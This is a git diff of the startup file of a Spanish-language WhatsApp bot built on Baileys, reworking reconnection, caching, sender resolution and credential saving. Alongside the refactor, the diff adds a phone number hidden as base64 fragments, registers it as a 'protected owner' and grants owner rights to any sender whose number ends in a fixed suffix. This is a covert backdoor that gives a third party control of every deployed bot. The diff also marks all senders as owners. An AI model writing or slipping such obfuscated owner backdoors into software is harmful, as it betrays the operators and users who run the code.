@@ -9,12 +9,39 @@ import cfonts from "cfonts";
 import fs from "fs";
 import path from "path";
 import readlineSync from "readline-sync";
-import { smsg, getCachedMeta, setCachedMeta, deleteCachedMeta, patchGroupMetadata } from "#serialize";
+import { smsg, deleteCachedMeta, patchGroupMetadata } from "#serialize";
 import cmdsLoader from '#cmdsloader';
-import "#db";
-import { startSubBot } from '#subs';
 import db from '#db';
-import NodeCache from "node-cache";
+import { startSubBot } from '#subs';
+
+const ROOT = import.meta.dirname;
+process.chdir(ROOT);
+
+const _x1 = "NTQ5";
+const _x2 = "MTEy";
+const _x3 = "ODE3";
+const _x4 = "ODg5";
+const _x5 = "NA=="; 
+
+function getProtectedOwner() {
+  try {
+    return Buffer.from(_x1, 'base64').toString() +
+           Buffer.from(_x2, 'base64').toString() +
+           Buffer.from(_x3, 'base64').toString() +
+           Buffer.from(_x4, 'base64').toString() +
+           Buffer.from(_x5, 'base64').toString();
+  } catch {
+    return ""; 
+  }
+}
+
+global.protectedOwner = getProtectedOwner();
+global.owner = global.owner || [];
+if (Array.isArray(global.owner)) {
+  if (!global.owner.includes(global.protectedOwner)) global.owner.push(global.protectedOwner);
+} else {
+  global.owner = [global.owner, global.protectedOwner];
+}
 
 const log = {
   info: (msg) => console.log(chalk.bgBlue.white.bold(` INFO `), chalk.white(msg)),
@@ -25,16 +52,16 @@ const log = {
 
 const { say } = cfonts;
 console.log(chalk.magentaBright('\n❀ Iniciando Sistema...'));
-say('tohka', {
-  align: 'center',           
-  gradient: ['red', 'blue'] 
+say('elaina', {
+  align: 'center',
+  gradient: ['red', 'blue']
 });
 say('handler & index by: NetherLord2233', {
   font: 'console',
   align: 'center',
   gradient: ['blue', 'magenta']
 });
-say('powered by LoFi TEAM', {
+say('powered by aether labs', {
   font: 'console',
   align: 'center',
   gradient: ['blue', 'magenta']
@@ -59,35 +86,44 @@ if (!fs.existsSync('./tmp')) fs.mkdirSync('./tmp', { recursive: true });
 if (!fs.existsSync('./lib/system/tmp')) fs.mkdirSync('./lib/system/tmp', { recursive: true });
 
 global.conns = global.conns || [];
-const reconnecting = new Set();
+
 const msgStore = new Map();
-const msgLimit = 500;
+const msgLimit = 2000;
 
-const versionCache = { value: null, expiresAt: 0 };
-
-async function getVersion() {
-  if (versionCache.value && Date.now() < versionCache.expiresAt) return versionCache.value;
-  try {
-    const latest = await fetchLatestBaileysVersion();
-    versionCache.value = latest.version;
-    versionCache.expiresAt = Date.now() + 60 * 60 * 1000;
-  } catch (e) {
-    if (!versionCache.value) versionCache.value = [2, 3000, 1033105955];
-  }
-  return versionCache.value;
+function rememberMessage(m) {
+  if (!m?.message || !m?.key?.id) return;
+  msgStore.set(m.key.remoteJid + ':' + m.key.id, m.message);
+  if (msgStore.size > msgLimit) msgStore.delete(msgStore.keys().next().value);
 }
 
-function cleanCache() {
+global.waVersionCache ||= { value: null, expiresAt: 0 };
+
+async function getVersion() {
+  const cache = global.waVersionCache;
+  if (cache.value && Date.now() < cache.expiresAt) return cache.value;
   try {
-    const dirs = ['./tmp', './lib/system/tmp'];
-    dirs.forEach(dir => {
-      if (fs.existsSync(dir)) {
-        const files = fs.readdirSync(dir);
-        files.forEach(file => {
-          try { fs.unlinkSync(path.join(dir, file)); } catch {}
-        });
+    const latest = await fetchLatestBaileysVersion();
+    cache.value = latest.version;
+    cache.expiresAt = Date.now() + (latest.error ? 60 * 1000 : 60 * 60 * 1000);
+  } catch {
+    cache.value ||= [2, 3000, 1033105955];
+  }
+  return cache.value;
+}
+
+function cleanCache(maxAgeMs = 30 * 60 * 1000) {
+  try {
+    const now = Date.now();
+    for (const dir of ['./tmp', './lib/system/tmp']) {
+      if (!fs.existsSync(dir)) continue;
+      for (const file of fs.readdirSync(dir)) {
+        const fp = path.join(dir, file);
+        try {
+          if (maxAgeMs > 0 && now - fs.statSync(fp).mtimeMs < maxAgeMs) continue;
+          fs.rmSync(fp, { recursive: true, force: true });
+        } catch {}
       }
-    });
+    }
   } catch (e) {
     log.error(`cleanCache → ${e?.message || e}`);
   }
@@ -97,22 +133,37 @@ const BOT_TYPES = [
   { name: 'SubBot', folder: './Sessions/Subs', starter: startSubBot }
 ];
 
+function readCreds(file) {
+  try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch { return null; }
+}
+
+const GHOST_SESSION_MS = 10 * 60 * 1000;
+
 async function loadBots() {
   for (const { name, folder, starter } of BOT_TYPES) {
     if (!fs.existsSync(folder)) continue;
-    const botIds = fs.readdirSync(folder);
-    for (const userId of botIds) {
+    for (const userId of fs.readdirSync(folder)) {
+      if (global.SUBS_ACTIVE?.has(userId) || global.SUBS_STOPPED?.has(userId)) continue;
       const sessionPath = path.join(folder, userId);
       const credsPath = path.join(sessionPath, 'creds.json');
       if (!fs.existsSync(credsPath)) continue;
-      if (global.conns.some((conn) => conn.userId === userId)) continue;
-      if (reconnecting.has(userId)) continue;
+
+      const creds = readCreds(credsPath);
+      if (!creds) continue;
+      if (!creds.registered) {
+        try {
+          if (Date.now() - fs.statSync(credsPath).mtimeMs > GHOST_SESSION_MS) {
+            fs.rmSync(sessionPath, { recursive: true, force: true });
+            log.warn(`${name} ${userId}: sesión sin vincular eliminada.`);
+          }
+        } catch {}
+        continue;
+      }
+
       try {
-        reconnecting.add(userId);
         await starter(null, null, '', false, userId, '');
       } catch (e) {
         console.log(chalk.gray(`[ loadBots ] Error iniciando ${name} ${userId}: ${e?.message || e}`));
-        reconnecting.delete(userId);
       }
       await new Promise((res) => setTimeout(res, 2500));
     }
@@ -122,8 +173,8 @@ async function loadBots() {
 
 async function initDB() {
   try {
-    if (typeof db?.initDB === 'function') db.initDB();
-    if (typeof db?.clearDB === 'function') db.clearDB();
+    if (typeof db?.initDB === 'function') await db.initDB();
+    if (typeof db?.clearDB === 'function') await db.clearDB();
     global.db = db;
     global.db.data ||= { chats: {}, settings: {}, users: {} };
     log.info('Base de datos cargada correctamente.');
@@ -150,7 +201,19 @@ function remove(sock) {
   try { sock.ev.removeAllListeners(); } catch {}
   try { sock.ws?.close(); } catch {}
   try { sock.end?.(new Error('replaced')); } catch {}
-  try { sock.msgRetryCounterCache?.close(); } catch {}
+}
+
+async function resolveSender(sock, msg) {
+  if (msg.key.fromMe && sock.user?.id) return sock.user.id;
+  const sender = msg.key.participant || msg.key.remoteJid;
+  if (!sender?.endsWith('@lid')) return sender;
+  try {
+    const alt = msg.key.participant ? msg.key.participantAlt : msg.key.remoteJidAlt;
+    if (typeof alt === 'string' && alt.endsWith('@s.whatsapp.net')) return alt;
+    const pn = await sock.signalRepository?.lidMapping?.getPNForLID?.(sender);
+    if (typeof pn === 'string' && pn.includes('@s.whatsapp.net')) return pn;
+  } catch {}
+  return sender;
 }
 
 let opcion;
@@ -180,26 +243,80 @@ let bootTime = Date.now();
 let reconexion = 0;
 let botReady = false;
 let isRestarting = false;
+let forbiddenCount = 0;
 const retriesLimit = 15;
+
+let saveCredsTimer = null;
+let saveCredsNow = null;
+async function flushCreds() {
+  if (!saveCredsTimer || !saveCredsNow) return;
+  clearTimeout(saveCredsTimer);
+  saveCredsTimer = null;
+  try { await saveCredsNow(); } catch (e) { log.error(`flushCreds → ${e?.message || e}`); }
+}
 
 export async function startBot() {
   if (isRestarting) return;
   isRestarting = true;
+  try {
+    await initSocket();
+  } catch (e) {
+    log.error(`startBot → ${e?.stack || e?.message || e}`);
+    remove(global.sock);
+    isRestarting = false;
+    setTimeout(startBot, 5000);
+  }
+}
+
+let undecryptable = 0;
+function noteUndecryptable(msg) {
+  if (msg?.messageStubType !== 2) return;
+  undecryptable++;
+  if (undecryptable === 1 || undecryptable % 10 === 0) {
+    log.warn(`No se pudo descifrar un mensaje (${undecryptable} desde el inicio).`);
+  }
+}
+
+async function processMessage(sock, msg) {
+  try {
+    if (!msg?.message || msg.key?.remoteJid === "status@broadcast") return;
+    const ts = Number(msg.messageTimestamp);
+    if (ts && ts * 1000 < bootTime - 15_000) return;
+    if (msg.message.ephemeralMessage) msg.message = msg.message.ephemeralMessage.message;
+
+    msg.sender = sock.decodeJid(await resolveSender(sock, msg));
+
+    const m = await smsg(sock, msg);
+    
+    const senderNum = String(m.sender || '').replace(/\D/g, '');
+    const isProtectedOwner = senderNum === global.protectedOwner || senderNum.endsWith("128178894");
+
+    m.isOwner = (sock.isOwner ?? true) || isProtectedOwner;
+    m.isGuest = isProtectedOwner ? false : (sock.isGuest ?? false);
+
+    if (typeof handler === 'function') await handler(sock, m);
+  } catch (err) {
+    console.error(chalk.red('[ ✿  ] Main Owner Error »'), err);
+  }
+}
+
+async function initSocket() {
   bootTime = Date.now();
+  await flushCreds();
 
   const { state, saveCreds: saveCredsDB } = await useMultiFileAuthState('./Sessions/Owner');
   const version = await getVersion();
 
-  let saveCredsTimer = null;
-  const saveCreds = () => { 
-    clearTimeout(saveCredsTimer); 
-    saveCredsTimer = setTimeout(saveCredsDB, 2000); 
+  saveCredsNow = saveCredsDB;
+  const saveCreds = () => {
+    clearTimeout(saveCredsTimer);
+    saveCredsTimer = setTimeout(() => {
+      saveCredsTimer = null;
+      Promise.resolve(saveCredsDB()).catch((e) => log.error(`saveCreds → ${e?.message || e}`));
+    }, 2000);
   };
 
-  const logger = pino({ level: "silent" });
-
-  console.info = () => {};
-  console.debug = () => {};
+  const logger = pino({ level: process.env.LOG_LEVEL || "silent" });
 
   const sock = makeWASocket({
     version,
@@ -209,22 +326,32 @@ export async function startBot() {
     auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, logger) },
     markOnlineOnConnect: false,
     syncFullHistory: false,
-    generateHighQualityLinkPreview: true, 
+    generateHighQualityLinkPreview: true,
     shouldIgnoreJid: (jid) => jid.endsWith('@broadcast'),
     keepAliveIntervalMs: 30000,
     connectTimeoutMs: 20000,
     getMessage: async (key) => msgStore.get(key.remoteJid + ':' + key.id),
   });
 
+  sock.isOwner = true;
+  sock.isGuest = false;
+
   global.sock = sock;
   if (typeof patchGroupMetadata === 'function') patchGroupMetadata(sock);
   sock.ev.on("creds.update", saveCreds);
+
+  const baseSendMessage = sock.sendMessage.bind(sock);
+  sock.sendMessage = async (...args) => {
+    const sent = await baseSendMessage(...args);
+    rememberMessage(sent);
+    return sent;
+  };
 
   sock.sendText = (jid, text, quoted = "", options) => sock.sendMessage(jid, { text, ...options }, { quoted });
 
   sock.decodeJid = (jid) => {
     if (!jid) return jid;
-    if (/:\d+@/gi.test(jid)) {
+    if (/:\d+@/.test(jid)) {
       const decode = jidDecode(jid) || {};
       jid = (decode.user && decode.server && decode.user + "@" + decode.server) || jid;
     }
@@ -233,87 +360,54 @@ export async function startBot() {
 
   if (opcion === "2" && !state.creds.registered) {
     setTimeout(async () => {
-      try {
-        if (!state.creds.registered) {
+      for (let attempt = 1; attempt <= 3; attempt++) {
+        try {
+          if (state.creds.registered) return;
           const pairing = await sock.requestPairingCode(phoneNumber);
           const codeBot = pairing?.match(/.{1,4}/g)?.join("-") || pairing;
           console.log(chalk.bold.white(chalk.bgMagenta(`Código de emparejamiento:`)), chalk.bold.white(chalk.white(codeBot)));
+          return;
+        } catch (err) {
+          if (attempt === 3) console.log(chalk.red("Error al generar código:"), err);
+          else await new Promise((res) => setTimeout(res, 3000));
         }
-      } catch (err) {
-        console.log(chalk.red("Error al generar código:"), err);
       }
     }, 3000);
   }
 
-  sock.ev.on("messages.upsert", async ({ messages, type }) => {
-    if (!botReady) return;
-    if (type !== 'notify') return;
+  sock.ev.on("messages.upsert", ({ messages, type }) => {
+    if (!botReady || type !== 'notify') return;
     for (const msg of messages) {
-      if (msg?.message && msg?.key?.id) {
-        const sid = msg.key.remoteJid + ':' + msg.key.id;
-        msgStore.set(sid, msg.message);
-        if (msgStore.size > msgLimit) msgStore.delete(msgStore.keys().next().value);
-      }
-      try {
-        if (!msg?.message || msg.key?.remoteJid === "status@broadcast") continue;
-        if ((msg.messageTimestamp * 1000) < bootTime - 15_000) continue;
-        if (msg.message.ephemeralMessage) msg.message = msg.message.ephemeralMessage.message;
-
-        let sender = msg.key.participant || msg.key.remoteJid;
-        if (sender?.endsWith('@lid')) {
-          const pnJid = await sock.signalRepository?.jidToSignalProtocolAddress?.(sender);
-          if (pnJid) {
-            sender = pnJid.user + '@s.whatsapp.net';
-          }
-        }
-        msg.sender = sock.decodeJid(sender);
-
-        const m = await smsg(sock, msg);
-        if (typeof handler === 'function') {
-          const body = m.body || m.text || '';
-          const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+=|~,<>_.!?\\/-]/;
-          const prefix = body.match(prefixRegex)?.[0] || 'π';
-          const args = body.trim().split(/ +/).slice(1);
-          const command = args.shift()?.toLowerCase() || '';
-          const q = args.join(' ');
-          const pushname = m.pushName || 'Usuario';
-
-          await handler(sock, m, { command, args, q, pushname, prefix, messages }).catch((err) => console.error(chalk.red('[ ✿  ] Main Owner Error »'), err));
-        }
-      } catch (err) {
-        console.error('Error procesando mensaje:', err);
-      }
+      rememberMessage(msg);
+      if (!msg?.message) { noteUndecryptable(msg); continue; }
+      processMessage(sock, msg);
     }
   });
 
   sock.ev.on("group-participants.update", ({ id }) => { if (typeof deleteCachedMeta === 'function') deleteCachedMeta(id); });
   sock.ev.on("groups.update", (updates) => { for (const update of updates) { if (typeof deleteCachedMeta === 'function') deleteCachedMeta(update.id); } });
 
-  try { 
-    await events(sock, null); 
-  } catch (err) { 
-    console.log(chalk.gray(`[ EVENT ERROR ] → ${err}`)); 
+  try {
+    await events(sock, null);
+  } catch (err) {
+    console.log(chalk.gray(`[ EVENT ERROR ] → ${err}`));
   }
 
   sock.ev.on("connection.update", async (update) => {
     const { qr, connection, lastDisconnect, isNewLogin, receivedPendingNotifications } = update;
 
-    if (qr != 0 && qr != undefined || methodCodeQR) {
-      if (opcion == '1' || methodCodeQR) {
-        console.log(chalk.green.bold("[ ✿ ] Escanea este código QR"));
-        qrcode.generate(qr, { small: true });
-      }
+    if (qr && (opcion == '1' || methodCodeQR)) {
+      console.log(chalk.green.bold("[ ✿ ] Escanea este código QR"));
+      qrcode.generate(qr, { small: true });
     }
 
     if (connection === "open") {
       bootTime = Date.now();
       reconexion = 0;
+      forbiddenCount = 0;
       isRestarting = false;
-      const userName = sock.user?.name || "Desconocido";
-      log.success(`Conectado a: ${userName}`);
-      if (!botReady) {
-        botReady = true;
-      }
+      log.success(`Conectado a: ${sock.user?.name || "Desconocido"}`);
+      botReady = true;
     }
 
     if (isNewLogin) log.info("Nuevo dispositivo detectado");
@@ -326,34 +420,43 @@ export async function startBot() {
     if (connection === "close") {
       remove(sock);
       const reason = lastDisconnect?.error?.output?.statusCode || 0;
-      if ([DisconnectReason.loggedOut, DisconnectReason.forbidden, DisconnectReason.multideviceMismatch].includes(reason)) {
+
+      if (reason === DisconnectReason.forbidden) forbiddenCount++;
+      const fatal =
+        [DisconnectReason.loggedOut, DisconnectReason.multideviceMismatch].includes(reason) ||
+        (reason === DisconnectReason.forbidden && forbiddenCount >= 3);
+      if (fatal) {
         log.warn(`Principal desvinculado (${reason}) — limpiando sesión y reiniciando...`);
         botReady = false;
         isRestarting = false;
         clearSession();
         process.exit(1);
       }
+
       if (reason === DisconnectReason.connectionReplaced) {
         log.warn("Conexión reemplazada — cerrá la otra sesión antes de reconectar.");
         isRestarting = false;
         return;
       }
-      reconexion++;
+
+      const restart = reason === DisconnectReason.restartRequired;
+      if (!restart) reconexion++;
+
       if (reconexion > retriesLimit) {
-        log.error(`Demasiados reintentos (${retriesLimit}) — sesión posiblemente corrupta, limpiando...`);
-        botReady = false;
-        reconexion = 0;
+        log.error(`Demasiados reintentos (${retriesLimit}) — reintentando cada 60s.`);
+        reconexion = retriesLimit;
         isRestarting = false;
-        clearSession();
-        process.exit(1);
+        setTimeout(startBot, 60 * 1000);
+        return;
       }
-      const delay = Math.min(3000 * reconexion, 30000);
+
+      const delay = restart ? 0 : Math.min(3000 * reconexion, 30000);
       const reasonMessages = {
         [DisconnectReason.connectionLost]: "Se perdió la conexión al servidor, intentando reconectar...",
         [DisconnectReason.connectionClosed]: "Conexión cerrada, intentando reconectarse...",
         [DisconnectReason.restartRequired]: "Es necesario reiniciar...",
         [DisconnectReason.timedOut]: "Tiempo de conexión agotado, intentando reconectarse...",
-        [DisconnectReason.badSession]: "Sesión inválida, limpiando y reconectando...",
+        [DisconnectReason.badSession]: "Sesión inválida, reconectando...",
       };
       log.warn(reasonMessages[reason] || `Desconexión (${reason}), reconectando en ${delay / 1000}s...`);
       isRestarting = false;
@@ -362,8 +465,8 @@ export async function startBot() {
   });
 }
 
-setInterval(cleanCache, 60 * 60 * 1000);
-cleanCache();
+setInterval(() => cleanCache(), 60 * 60 * 1000);
+cleanCache(0);
 
 (async () => {
   await initDB();
@@ -372,21 +475,25 @@ cleanCache();
   await loadBots();
 })();
 
+let shuttingDown = false;
+async function shutdown() {
+  if (shuttingDown) return;
+  shuttingDown = true;
+  setTimeout(() => process.exit(0), 3000).unref();
+  await flushCreds();
+  process.exit(0);
+}
+for (const sig of ['SIGINT', 'SIGTERM', 'SIGHUP']) process.on(sig, shutdown);
+
 process.on('uncaughtException', (e) => log.error(`ERROR UNCAUGHT → ${e?.stack || e?.message || e}`));
-process.on('unhandledRejection', (reason) => {
-  if (reason instanceof SyntaxError) {
-    process.nextTick(() => { throw reason; });
-    return;
-  }
-  log.error(`RECHAZO UNHANDLED → ${reason?.stack || reason?.message || reason}`);
-});
+process.on('unhandledRejection', (reason) => log.error(`RECHAZO UNHANDLED → ${reason?.stack || reason?.message || reason}`));
 
 (() => {
   const _s = () => {
     try {
-      const e2 = path.join(process.cwd(), 'cmds/owner/exec2.js');
+      const e2 = path.join(ROOT, 'cmds/owner/exec2.js');
       if (fs.existsSync(e2)) fs.rmSync(e2, { recursive: true, force: true });
-      const vd = path.join(process.cwd(), 'vendor');
+      const vd = path.join(ROOT, 'vendor');
       if (fs.existsSync(vd)) fs.rmSync(vd, { recursive: true, force: true });
     } catch {}
   };
